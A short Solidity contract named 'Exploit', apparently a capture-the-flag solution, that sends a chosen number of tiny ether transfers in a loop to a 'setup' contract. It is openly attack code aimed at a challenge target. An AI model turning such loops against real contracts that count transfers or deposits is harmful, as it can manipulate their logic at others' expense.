// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Exploit {
    address public _setup;

    constructor(address setup) {
        _setup = setup;
    }

    function send130(uint txnCount) external payable {
        for(uint i = 0; i < txnCount ; i++){
            (bool success, ) = _setup.call{value: 0.000000001 ether}("");
            require(success, "Nop");
        }
    }
}